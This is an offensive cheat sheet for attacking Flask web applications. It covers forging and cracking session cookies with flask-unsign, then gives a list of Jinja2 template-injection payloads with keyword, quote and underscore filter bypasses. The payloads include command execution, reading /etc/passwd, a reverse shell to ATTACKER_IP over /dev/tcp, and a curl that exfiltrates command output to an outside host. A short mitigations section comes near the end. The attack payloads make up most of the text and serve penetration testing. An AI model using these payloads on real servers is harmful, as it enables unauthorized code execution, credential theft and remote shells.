## 1. Overview

Flask is a lightweight Python web framework that uses **signed cookies** for session management. The session data is stored client-side in a cookie, encoded in base64, and signed with a secret key using HMAC. If the secret key is weak or leaked, attackers can forge session cookies and potentially achieve **Server-Side Template Injection (SSTI)** through Flask's Jinja2 templating engine.

**Key Risks:**

- **Weak Secret Keys** → Session forgery
- **SSTI via Jinja2** → Remote Code Execution (RCE)
- **Exposed Debug Mode** → Information disclosure + code execution

---

## 2. Exploitation Methods

### 2.1 Flask Session Cookie Decoding & Forging

**Tool:** `flask-unsign`

#### Installation

```bash
pip3 install flask-unsign
```

#### Check: Decode a Cookie

```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

#### Check: Extract Cookie from Server

```bash
flask-unsign --decode --server 'https://target.com/login'
```

#### Crack the Secret Key

```bash
flask-unsign --unsign --cookie < cookie.txt
flask-unsign --unsign --cookie < cookie.txt --wordlist wordlist.txt
```

#### Forge a New Session

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
flask-unsign --sign --cookie "{'user_id': 1, 'is_admin': True}" --secret 'leaked_secret'
```

---

### 2.2 Server-Side Template Injection (SSTI)

Flask uses **Jinja2** for templating. If user input is reflected in templates without proper escaping, you can inject code.

#### Detection Payloads

```python
{{7*7}}              # Returns 49 if vulnerable
${7*7}               # Alternative syntax
{{7*'7'}}            # Returns 7777777
```

#### Basic Information Gathering

```python
{{config}}                          # Exposes app config (may leak SECRET_KEY)
{{self}}                            # Access template context
{{request.environ}}                 # Exposes environment variables
{{url_for.__globals__}}             # Access global namespace
```

#### Accessing Python Builtins

```python
{{request.__class__}}
{{request['__class__']}}
{{request|attr('__class__')}}
{{request[\x5f\x5fclass\x5f\x5f]}}  # Hex-encoded __class__
```

---

## 3. Bypasses

### 3.1 Filter Evasion Techniques

#### Bypassing Keyword Filters

```python
# If "class" is blocked:
{{request['__cl'+'ass__']}}
{{request|attr('\x5f\x5fclass\x5f\x5f')}}
{{request|attr(['_'*2,'class','_'*2]|join)}}

# If "config" is blocked:
{{self.__dict__._TemplateReference__context.config}}
{{url_for.__globals__.current_app.config}}

# If dots are blocked:
{{request['application']['__globals__']['__builtins__']['open']('/etc/passwd')['read']()}}
```

#### Bypassing Quote Filters

```python
{{request|attr(request.args.x)}}&x=__class__
{{request|attr(request.cookies.x)}}&x=__class__
```

#### Bypassing Underscore Filters

```python
{{request|attr('\x5f\x5fclass\x5f\x5f')}}
{{request|attr([request.args.a,request.args.a]|join)}}&a=__class__
```

---

## 4. Payloads

### Top 10 Modern SSTI Payloads for Flask/Jinja2

#### 1. Read File via `open()`

```python
{{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}
```

#### 2. RCE via `os.popen()`

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

#### 3. RCE via `subprocess.Popen`

```python
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
```

#### 4. RCE via `importlib`

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

#### 5. Read Config (Leak SECRET_KEY)

```python
{{config.items()}}
{{self.__dict__._TemplateReference__context.config}}
```

#### 6. Reverse Shell

```python
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}
```

#### 7. Write File

```python
{{''.__class__.__mro__[1].__subclasses__()[40]('/tmp/shell.sh','w').write('bash -i >& /dev/tcp/IP/PORT 0>&1')}}
```

#### 8. Access Request Object

```python
{{request.environ['werkzeug.server.shutdown']()}}
```

#### 9. Bypassing WAF with Hex Encoding

```python
{{request|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

#### 10. Blind RCE with DNS Exfiltration

```python
{{config.__class__.__init__.__globals__['os'].popen('curl http://burpcollaborator.net?data=$(whoami)').read()}}
```

---

## 5. Higher Impact Scenarios

### 5.1 Session Forgery → Admin Takeover

1. **Decode session cookie** → find user structure
2. **Crack secret key** using wordlist
3. **Forge admin session** with elevated privileges
4. **Access admin panel** or sensitive endpoints

### 5.2 SSTI → Full RCE

1. **Inject payload** in vulnerable parameter (name, search, etc.)
2. **Read `/proc/self/environ`** to leak secrets or keys
3. **Execute reverse shell** for persistent access
4. **Pivot internally** if server has network access

### 5.3 Config Leakage → Credential Harvesting

```python
{{config}}
```

May expose:

- `SECRET_KEY` → forge sessions
- Database credentials
- API keys, tokens
- Internal endpoints

### 5.4 Debug Mode Exploitation

If Flask debug mode is enabled:

- **Interactive debugger** in browser (PIN bypass possible)
- **Full stack traces** expose code structure
- **Werkzeug console** allows arbitrary Python execution

---

## 6. Mitigations

### For Developers

✅ **Use strong, random SECRET_KEY**

```python
import os
app.config['SECRET_KEY'] = os.urandom(24)
```

✅ **Never render user input directly in templates**

```python
# BAD:
return render_template_string(f"Hello {user_input}")

# GOOD:
return render_template('template.html', name=user_input)
```

✅ **Disable debug mode in production**

```python
app.run(debug=False)
```

✅ **Use auto-escaping** (enabled by default in Jinja2)

```python
{{ user_input | e }}
```

✅ **Implement Content Security Policy (CSP)**  
✅ **Rate-limit endpoints** to prevent brute-forcing secret keys  
✅ **Store sensitive data server-side**, not in client cookies

---

## Quick Command Reference

```bash
# Decode Flask session
flask-unsign --decode --cookie 'COOKIE_HERE'

# Crack secret key
flask-unsign --unsign --cookie 'COOKIE_HERE' --wordlist rockyou.txt

# Forge new session
flask-unsign --sign --cookie "{'is_admin': True}" --secret 'cracked_secret'

# Test SSTI
curl "https://target.com/search?q={{7*7}}"
curl "https://target.com/user?name={{config}}"
```

---

**🎯 Pro Tips:**

- Always test `{{config}}` first — it often leaks the SECRET_KEY
- Check for SSTI in **headers, cookies, POST data** — not just URL params
- Use Burp Collaborator for blind SSTI detection
- Automate secret key cracking with custom wordlists (common words, app name, etc.)